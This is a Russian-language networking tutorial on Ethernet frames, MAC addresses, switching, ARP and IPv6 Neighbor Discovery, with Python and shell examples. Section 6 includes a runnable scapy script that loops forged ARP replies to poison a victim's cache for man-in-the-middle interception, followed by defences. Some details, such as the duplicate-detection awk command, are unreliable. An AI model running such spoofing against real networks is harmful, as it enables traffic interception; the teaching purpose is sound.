# Ethernet, MAC-адреса, ARP

## Введение

Прежде чем IP-пакет попадёт в интернет, он должен пройти через локальную сеть. Здесь работают протоколы канального уровня — Ethernet и его сопутствующие механизмы. Ethernet (IEEE 802.3) — доминирующий протокол локальных сетей с 1970-х годов. Разработанный Робертом Меткалфом и Дэвидом Боггсом в Xerox PARC в 1973 году, он пережил десятки конкурентов (Token Ring, FDDI, ATM) и сегодня работает на скоростях 10, 40, 100 и 400 Гбит/с.

Но Ethernet решает только задачу «доставить кадр соседу». Для связи IP-адреса (уровень 3) с MAC-адресом (уровень 2) существует ARP — Address Resolution Protocol. Каждый раз когда ваш компьютер хочет отправить пакет по локальной сети, он использует ARP для нахождения физического адреса получателя.

Понимание этих механизмов критично для сетевой диагностики, безопасности (ARP spoofing — классическая атака MITM) и проектирования сетей.

---

## 1. Ethernet Frame

### 1.1 Структура кадра

Ethernet II frame (наиболее распространённый формат):

```
 Байты:  7      1      6        6       2        46-1500    4
┌────────┬───┬────────┬────────┬───────┬──────────┬────────┐
│Preamble│SFD│Dst MAC │Src MAC │EthType│ Payload  │  FCS   │
│10101...│10b│ 6 байт │ 6 байт │ 2 байт│          │  CRC32 │
└────────┴───┴────────┴────────┴───────┴──────────┴────────┘
```

- **Преамбула** (7 байт): `10101010...` — синхронизация тактового генератора получателя
- **SFD** (Start Frame Delimiter, 1 байт): `10101011` — начало кадра
- **Destination MAC** (6 байт): MAC-адрес получателя
- **Source MAC** (6 байт): MAC-адрес отправителя
- **EtherType** (2 байт): тип полезной нагрузки (0x0800=IPv4, 0x0806=ARP, 0x86DD=IPv6, 0x8100=VLAN)
- **Payload** (46-1500 байт): данные. Минимум 46 байт из-за требований CSMA/CD. Максимум 1500 байт — MTU (Maximum Transmission Unit)
- **FCS** (Frame Check Sequence, 4 байта): CRC-32 для обнаружения ошибок

Jumbo frames: некоторые сети поддерживают до 9000 байт payload (полезно для iSCSI, NFS).

### 1.2 Разбор кадра в Python

```python
import struct
import socket

def parse_ethernet_frame(data: bytes) -> dict:
    """Парсим Ethernet II кадр."""
    # struct format: !6s6sH
    # ! = big-endian
    # 6s = 6-байтовая строка (MAC)
    # H = unsigned short (EtherType)
    dst_mac, src_mac, ethertype = struct.unpack('!6s6sH', data[:14])
    
    return {
        'dst_mac': ':'.join(f'{b:02x}' for b in dst_mac),
        'src_mac': ':'.join(f'{b:02x}' for b in src_mac),
        'ethertype': f'0x{ethertype:04x}',
        'ethertype_name': {
            0x0800: 'IPv4',
            0x0806: 'ARP',
            0x86DD: 'IPv6',
            0x8100: '802.1Q VLAN',
        }.get(ethertype, f'Unknown (0x{ethertype:04x})'),
        'payload': data[14:],
    }

# Пример (требует root для raw socket):
# with socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)) as s:
#     raw_data, addr = s.recvfrom(65536)
#     frame = parse_ethernet_frame(raw_data)
#     print(frame)
```

---

## 2. MAC-адреса

### 2.1 Структура MAC-адреса

MAC-адрес (Media Access Control) — уникальный идентификатор сетевого интерфейса, 48 бит (6 байт):

```
 OUI (24 бита)               NIC-specific (24 бита)
┌──────────────────────────┬──────────────────────────┐
│  AA : BB : CC            │  DD : EE : FF            │
└──────────────────────────┴──────────────────────────┘
  └─┬─┘
    └── Bit 0 (LSB of первого байта):
        0 = Unicast
        1 = Multicast/Broadcast
    └── Bit 1:
        0 = Globally Unique (IEEE assigned)
        1 = Locally Administered
```

**OUI** (Organizationally Unique Identifier) — первые 3 байта, назначаются IEEE производителям:
- `00:1A:2B` — пример OUI (принадлежит конкретному вендору)
- `FF:FF:FF:FF:FF:FF` — broadcast (отправить всем в сегменте)
- `01:00:5E:xx:xx:xx` — IPv4 multicast
- `33:33:xx:xx:xx:xx` — IPv6 multicast

```bash
# Узнать производителя по MAC-адресу
# OUI 00:1A:2B → ищем в базе IEEE
# Онлайн: https://regauth.standards.ieee.org/standards-ra-web/pub/view.html

# Или локально:
grep "00:1A:2B" /var/lib/ieee-data/oui.txt

# В Linux:
ip link show
# 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP>
#     link/ether 00:1a:2b:cc:dd:ee brd ff:ff:ff:ff:ff:ff
```

### 2.2 Коммутаторы и MAC-таблица

В отличие от хаба (который просто рассылает всё всем), коммутатор (switch) знает, за каким портом находится какой MAC-адрес. Это MAC-таблица (CAM table):

```
Порт | MAC-адрес         | Время жизни
-----|-------------------|-----------
  1  | 00:1A:2B:CC:DD:EE | 300s
  2  | AA:BB:CC:11:22:33 | 295s
  3  | 11:22:33:44:55:66 | 280s
```

Алгоритм работы коммутатора:
1. Получен кадр на порту X с источником MAC_src
2. Записываем `MAC_src → порт X` в таблицу
3. Ищем `MAC_dst` в таблице
4. Если найден → forwarding на конкретный порт
5. Если не найден → flooding (отправляем на все порты кроме входящего)
6. Если `MAC_dst == FF:FF:FF:FF:FF:FF` → flooding на все порты

```bash
# Просмотр MAC-таблицы на управляемых коммутаторах (Cisco IOS):
# show mac address-table

# Linux bridge (software switch):
bridge fdb show
```

---

## 3. CSMA/CD — исторический контекст

В ранних Ethernet (10BASE-5, 10BASE-2) все устройства были в одном коллизионном домене. CSMA/CD (Carrier Sense Multiple Access / Collision Detection):

1. **Carrier Sense**: прежде чем передавать, слушай канал — свободен ли?
2. **Multiple Access**: все могут передавать, когда канал свободен
3. **Collision Detection**: если коллизия обнаружена — остановить передачу, послать jam signal, подождать случайное время (exponential backoff), повторить

Сегодня CSMA/CD **неактуален**: все современные Ethernet-сети используют full-duplex с коммутаторами. Каждый порт — отдельный коллизионный домен. Коллизий нет.

```
Старый (полудуплекс, хаб):          Современный (полный дуплекс, коммутатор):
A ────┬──── B                        A ──── Switch ──── B
      │                                      │
      C                                      C
Все в одном домене, коллизии!       Каждый порт — свой домен, нет коллизий
```

---

## 4. ARP (Address Resolution Protocol)

### 4.1 Зачем нужен ARP

IP-пакет знает IP-адрес назначения. Но Ethernet-кадр нужно адресовать MAC-адресу. Как узнать MAC по IP? Именно для этого существует ARP.

```
Компьютер A хочет отправить пакет на 192.168.1.10:

1. A смотрит в ARP cache: есть ли запись для 192.168.1.10?
2. Нет → отправляем ARP Request (broadcast):
   "Кто имеет IP 192.168.1.10? Сообщите 192.168.1.1 (это я)"
3. Компьютер B (192.168.1.10) отвечает ARP Reply (unicast):
   "IP 192.168.1.10 → MAC AA:BB:CC:DD:EE:FF (это я)"
4. A записывает в ARP cache: 192.168.1.10 → AA:BB:CC:DD:EE:FF
5. A отправляет Ethernet кадр с dst MAC = AA:BB:CC:DD:EE:FF
```

### 4.2 Структура ARP пакета

```
 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
├───────────────────────────────────┬───────────────────────────────┤
│  Hardware Type (HTYPE) = 1        │ Protocol Type (PTYPE) = 0x0800│
│  (Ethernet)                       │ (IPv4)                        │
├───────────────────┬───────────────┴───────────────────────────────┤
│ Hardware Addr Len │ Protocol Addr Len │    Operation (OPER)        │
│   (HLEN = 6)      │   (PLEN = 4)      │  1=Request, 2=Reply       │
├───────────────────┴───────────────────────────────────────────────┤
│                  Sender Hardware Address (SHA) - 6 bytes          │
│                       (Sender MAC)                                │
├───────────────────────────────────────────────────────────────────┤
│              Sender Protocol Address (SPA) - 4 bytes              │
│                       (Sender IP)                                 │
├───────────────────────────────────────────────────────────────────┤
│                  Target Hardware Address (THA) - 6 bytes          │
│         (Target MAC, = 00:00:00:00:00:00 в Request)               │
├───────────────────────────────────────────────────────────────────┤
│              Target Protocol Address (TPA) - 4 bytes              │
│                  (Target IP, кого ищем)                           │
└───────────────────────────────────────────────────────────────────┘
```

### 4.3 ARP cache

```bash
# Просмотр ARP-кеша
arp -n
# Address         HWtype  HWaddress           Flags Iface
# 192.168.1.1     ether   aa:bb:cc:dd:ee:ff   C     eth0
# 192.168.1.10    ether   11:22:33:44:55:66   C     eth0

# Современный вариант (iproute2)
ip neigh show
# 192.168.1.1 dev eth0 lladdr aa:bb:cc:dd:ee:ff REACHABLE
# 192.168.1.10 dev eth0 lladdr 11:22:33:44:55:66 STALE

# Состояния: REACHABLE → STALE → PROBE → FAILED
# По умолчанию кеш живёт 30 секунд (net.ipv4.neigh.default.gc_stale_time)
```

### 4.4 Реализация ARP в Python

```python
import struct
import socket

def build_arp_request(
    sender_mac: bytes,  # 6 bytes
    sender_ip: bytes,   # 4 bytes  
    target_ip: bytes    # 4 bytes
) -> bytes:
    """Строим ARP Request пакет."""
    # ARP заголовок
    arp_header = struct.pack(
        '!HHBBH6s4s6s4s',
        1,                      # Hardware type: Ethernet
        0x0800,                 # Protocol type: IPv4
        6,                      # Hardware addr length
        4,                      # Protocol addr length
        1,                      # Operation: Request
        sender_mac,             # Sender MAC
        sender_ip,              # Sender IP
        b'\x00' * 6,           # Target MAC (unknown)
        target_ip               # Target IP (кого ищем)
    )
    
    # Ethernet заголовок
    eth_header = struct.pack(
        '!6s6sH',
        b'\xff' * 6,           # Dst MAC: broadcast
        sender_mac,             # Src MAC
        0x0806                  # EtherType: ARP
    )
    
    return eth_header + arp_header

# Пример использования (требует root):
def arp_scan(interface: str, target_ip: str):
    src_mac = bytes.fromhex('001a2bccddee')  # MAC нашего интерфейса
    src_ip = socket.inet_aton('192.168.1.100')
    dst_ip = socket.inet_aton(target_ip)
    
    packet = build_arp_request(src_mac, src_ip, dst_ip)
    
    with socket.socket(socket.AF_PACKET, socket.SOCK_RAW) as s:
        s.bind((interface, 0))
        s.send(packet)
        
        # Ждём ответа
        s.settimeout(2.0)
        try:
            response = s.recv(65535)
            # Парсим ответ...
            print(f"Got response from {target_ip}")
        except socket.timeout:
            print(f"No response from {target_ip}")
```

---

## 5. Gratuitous ARP

Gratuitous ARP — ARP-запрос или ответ, где sender_ip == target_ip. Используется:
- При загрузке системы для объявления своего MAC
- После изменения MAC-адреса (например, при failover)
- Для обновления ARP-кешей соседей

```bash
# Отправить gratuitous ARP (обновить кеши соседей)
arping -U -I eth0 192.168.1.100

# При failover (например, keepalived):
# Когда VIP переходит с одного сервера на другой,
# новый владелец рассылает gratuitous ARP:
# "IP 192.168.1.200 теперь у меня, MAC = NEW_MAC"
```

---

## 6. ARP Spoofing — атака MITM

ARP — не аутентифицированный протокол. Любой может ответить на ARP-запрос с поддельной информацией:

```
Легитимная таблица ARP хоста A:
192.168.1.1 (шлюз) → MAC_GATEWAY

После ARP-спуфинга атакующим C:
192.168.1.1 (шлюз) → MAC_ATTACKER  ← Неправильно!

Теперь весь трафик A → шлюз проходит через C:
A → C (думает что это шлюз) → Gateway → Internet
        ↑
    Man-in-the-Middle
```

```python
# Иллюстрация ARP spoofing (для образовательных целей)
# НЕ ИСПОЛЬЗОВАТЬ в реальных сетях без разрешения

from scapy.all import ARP, Ether, sendp
import time

def arp_spoof(target_ip: str, spoof_ip: str, interface: str = 'eth0'):
    """
    target_ip: IP жертвы (чей ARP-кеш отравляем)
    spoof_ip: IP который мы «крадём» (обычно шлюз)
    """
    # Создаём поддельный ARP Reply
    arp_reply = ARP(
        op=2,              # ARP Reply
        pdst=target_ip,    # Жертва
        hwdst='ff:ff:ff:ff:ff:ff',  # Или MAC жертвы
        psrc=spoof_ip,     # IP который "крадём"
        # hwsrc автоматически = наш MAC
    )
    
    packet = Ether() / arp_reply
    
    while True:
        sendp(packet, iface=interface, verbose=False)
        time.sleep(2)  # Обновляем каждые 2 секунды (кеш живёт 30с)
```

### 6.1 Защита от ARP Spoofing

```bash
# 1. Статические ARP записи (для шлюза)
arp -s 192.168.1.1 aa:bb:cc:dd:ee:ff

# 2. Dynamic ARP Inspection (DAI) на управляемых коммутаторах (Cisco):
# ip dhcp snooping
# ip arp inspection vlan 1

# 3. Мониторинг:
arpwatch  # Демон, следящий за изменениями ARP

# 4. Использование IPv6 + ND (Neighbor Discovery) с SEND (Secure ND)

# 5. Сетевая сегрегация (VLAN, Zero Trust)
```

---

## 7. IPv6: Neighbor Discovery Protocol (NDP)

В IPv6 ARP заменён NDP (Neighbor Discovery Protocol, RFC 4861), работающим поверх ICMPv6:

| Сообщение | Назначение | IPv4 аналог |
|-----------|-----------|-------------|
| Neighbor Solicitation (NS) | Запрос MAC по IPv6 | ARP Request |
| Neighbor Advertisement (NA) | Ответ с MAC | ARP Reply |
| Router Solicitation (RS) | Найти маршрутизатор | - |
| Router Advertisement (RA) | Объявление маршрутизатора | DHCP |
| Redirect | Более оптимальный маршрут | ICMP Redirect |

```bash
# Просмотр NDP кеша в IPv6
ip -6 neigh show
# fe80::1 dev eth0 lladdr aa:bb:cc:dd:ee:ff router REACHABLE
```

---

## 8. Практика: диагностика с Wireshark/tcpdump

```bash
# Захват ARP-трафика
tcpdump -i eth0 arp -v

# Пример вывода:
# 14:35:21.123456 ARP, Request who-has 192.168.1.1 tell 192.168.1.100, length 28
# 14:35:21.124567 ARP, Reply 192.168.1.1 is-at aa:bb:cc:dd:ee:ff, length 28

# Мониторинг ARP с временными метками
tcpdump -i eth0 -enn arp

# Просмотр всех соседей
ip neigh show nud all

# Обнаружение ARP spoofing (два разных MAC для одного IP):
arp -n | awk '{print $1}' | sort | uniq -d
# Если есть дубликаты IP — возможно отравление
```

---

## Заключение

Ethernet и ARP — незаметный фундамент, на котором работает весь интернет. Каждый пакет, прежде чем покинуть локальную сеть, проходит через механизм ARP-разрешения и упаковывается в Ethernet-кадр.

**Ключевые выводы**:

1. **Ethernet frame** — 6 байт dst MAC + 6 байт src MAC + 2 байта EtherType + payload + FCS. MTU = 1500 байт.

2. **MAC-адрес** = 24-битный OUI (вендор) + 24-битный NIC-specific. `FF:FF:FF:FF:FF:FF` — broadcast.

3. **Коммутатор** строит MAC-таблицу (CAM table) и делает forwarding по конкретным портам. Неизвестный MAC → flooding.

4. **ARP** — broadcast запрос «Кто имеет IP X?» + unicast ответ с MAC. Результат кешируется на ~30 секунд.

5. **ARP Spoofing** — классическая MITM-атака. Защита: DAI на коммутаторах, статические ARP записи, arpwatch.

6. **IPv6 использует NDP** вместо ARP — более богатый протокол с поддержкой SLAAC и Router Discovery.

---

## Литература и источники

1. Metcalfe, R. M., & Boggs, D. R. (1976). Ethernet: Distributed packet switching for local computer networks. *Communications of the ACM*, 19(7).
2. RFC 826. An Ethernet Address Resolution Protocol. D. Plummer. IETF. https://tools.ietf.org/html/rfc826
3. RFC 4861. Neighbor Discovery for IP version 6 (IPv6). IETF. https://tools.ietf.org/html/rfc4861
4. IEEE 802.3-2022. IEEE Standard for Ethernet. https://standards.ieee.org/ieee/802.3/10422/
5. Stevens, W. R. (1994). *TCP/IP Illustrated, Volume 1*. Addison-Wesley.
6. Wikipedia. Ethernet frame. https://en.wikipedia.org/wiki/Ethernet_frame
7. Wikipedia. Address Resolution Protocol. https://en.wikipedia.org/wiki/Address_Resolution_Protocol
8. Wikipedia. ARP spoofing. https://en.wikipedia.org/wiki/ARP_spoofing
9. Tanenbaum, A. S. (2010). *Computer Networks*, 5th Edition. Prentice Hall.
